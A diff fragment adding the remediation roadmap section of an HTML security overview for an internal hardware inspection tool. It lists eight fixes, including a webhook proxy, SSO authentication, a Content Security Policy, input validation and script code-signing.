+    <div class="section" id="roadmap">
+        <div class="section-label">Section 9</div>
+        <h2>Improvement Roadmap</h2>
+
+        <div class="plan-item">
+            <div class="plan-num">1</div>
+            <div class="plan-body">
+                <h3>Move webhook URL to a server-side proxy</h3>
+                <p>Deploy a thin backend endpoint (Azure Function, Cloudflare Worker, or WordPress REST route) that accepts the result payload and forwards it to Power Automate. The client never sees the webhook URL. Eliminates vulnerabilities §1 and §4 (rate limiting can be enforced at proxy level).</p>
+            </div>
+        </div>
+
+        <div class="plan-item">
+            <div class="plan-num">2</div>
+            <div class="plan-body">
+                <h3>Add submission authentication</h3>
+                <p>Require an SSO token (Azure AD / Microsoft 365) or a short-lived signed token issued per session by the proxy. Only authenticated Transpro users can submit. Eliminates vulnerability §2.</p>
+            </div>
+        </div>
+
+        <div class="plan-item">
+            <div class="plan-num">3</div>
+            <div class="plan-body">
+                <h3>Replace innerHTML with textContent for all API-sourced data</h3>
+                <p>Change <code>element.innerHTML = apiValue</code> to <code>element.textContent = apiValue</code> for all fields populated from ipapi.co. Add a DOMPurify sanitization pass as a secondary layer. Eliminates vulnerability §3.</p>
+            </div>
+        </div>
+
+        <div class="plan-item">
+            <div class="plan-num">4</div>
+            <div class="plan-body">
+                <h3>Add Content Security Policy</h3>
+                <p>Add a <code>&lt;meta http-equiv="Content-Security-Policy"&gt;</code> tag restricting <code>script-src</code> to <code>'self'</code> and known CDN origins only. Also enforce at the web server level via HTTP header. Eliminates vulnerability §8 and reduces blast radius of §3.</p>
+            </div>
+        </div>
+
+        <div class="plan-item">
+            <div class="plan-num">5</div>
+            <div class="plan-body">
+                <h3>Add input validation and sanitization</h3>
+                <p>Validate name (text only, max length), email (RFC 5322 regex), department (allowlist), location (text only) before submission. Strip or reject formula characters (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code> at field start). Eliminates vulnerability §5.</p>
+            </div>
+        </div>
+
+        <div class="plan-item">
+            <div class="plan-num">6</div>
+            <div class="plan-body">
+                <h3>Replace ipapi.co with a self-hosted or proxied GeoIP lookup</h3>
+                <p>Route the IP geolocation request through the same backend proxy (see §1 above), using a free MaxMind GeoLite2 database or the Cloudflare Workers <code>cf.city</code> object. No user IP data leaves the internal infrastructure. Eliminates vulnerability §6.</p>
+            </div>
+        </div>
+
+        <div class="plan-item">
+            <div class="plan-num">7</div>
+            <div class="plan-body">
+                <h3>Add data consent notice</h3>
+                <p>Add a one-time consent checkbox on the welcome screen listing all data collected (name, email, IP, hardware specs, location). Log consent timestamp in the SharePoint row. Eliminates vulnerability §7.</p>
+            </div>
+        </div>
+
+        <div class="plan-item">
+            <div class="plan-num">8</div>
+            <div class="plan-body">
+                <h3>Code-sign the PowerShell script</h3>
+                <p>Sign <code>run-speedtest.ps1</code> with a Transpro code-signing certificate and change the BAT to use <code>-ExecutionPolicy AllSigned</code>. Prevents tampered scripts from executing. Eliminates vulnerability §9.</p>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="footer">
+        Transpro IT — Hardware Inspection Tool — Technical Overview — April 2026
+    </div>
+
+</div>
+</body>
+</html>
